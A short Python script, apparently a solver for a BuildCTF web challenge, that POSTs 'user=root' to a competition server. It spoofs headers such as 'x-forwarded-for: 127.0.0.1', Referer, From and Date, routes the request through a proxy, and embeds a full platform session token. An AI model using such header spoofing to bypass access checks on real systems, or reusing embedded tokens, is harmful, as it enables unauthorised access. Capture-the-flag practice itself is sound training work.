import requests

# 代理设置
proxies = {
    "http": "http://buildctf.via",
    "https": "http://buildctf.via",
}

# 请求头
headers = {
    "Host": "27.25.151.80:32883",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "Origin": "http://27.25.151.80:32883",
    "Content-Type": "application/x-www-form-urlencoded",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "buildctf",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": "blog.buildctf.vip",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9,en-GB;q=0.8,en;q=0.7",
    "Cookie": "GZCTF_Token=CfDJ8HK89lxLDJFGkMjPh05_xUrW5U4R_gdMCgqOZIBqzxfeK7ZDXTo4Np6i9hE9PnCfi0XD75BJPhcQK6bnEm_NMcbLn_Bh43tqal6B6CZwyXN8PAm7SvwNuyvpXeRtxDiw8UVt3KY-_sQr6CsV7NIVQWNLow3T1fhUzl3iLOjLXnNjMLqX3F09j_5kZCCiyPZy58EtXqPBq1VWRQlbCtLECzD5EFa-Sf2NVZYGxpY5ZZ-tt8G6Zmby2cR01s7fcJzELyNiCe9xODYqn18hNdRU-jTHCay13fbYALeOevugiV1E__6PMA1IQYQhuOrSwzBKvXtM-gjRILMCHohhnHmQ4_BqHBOFgc3XVgasEu--ywMfqjHRLSyrGiCDxgeac1RhXnOoT-IAK5kn_Tq9Th9XB7yYl9Hnq-BOBUH4oT5jn90Mvx25AINKkhvD6mlq4HjT2M27wMtgV4ZWp81DQpKtAR0PRP8E28zR5ir97RqJ1lM-YQMJ8oXJ325qwhOISHFMxHhSYLMGx-U0KmpZAvwHaLbAp-9YxOBWo4ZtoEVKZAvCmm72VHWE_3BUT9MIgBIvoKE2Wn1g2g_vSvA3Gyb_XJIS2rMfzZEKyUST3Y29nnh29C4hXRSAo8GCa0wq7uRFPMrvsC80n_BqBk31Buj-EC4kiiBNPxjhkS2vEtZrWxYdaiDfb_qiAiaYBOp2GFF8rZmqDk4F3W4O2d3mcfTb4o0",
    "from": "root@buildctf.vip",
    "date": "2042.99.99",
    "x-forwarded-for": "127.0.0.1",
    "Connection": "close",
}

# 数据
data = {
    "user": "root"
}

# 发送请求
response = requests.post("http://27.25.151.80:32883/", headers=headers, data=data, proxies=proxies)

# 输出响应
print(response.text)

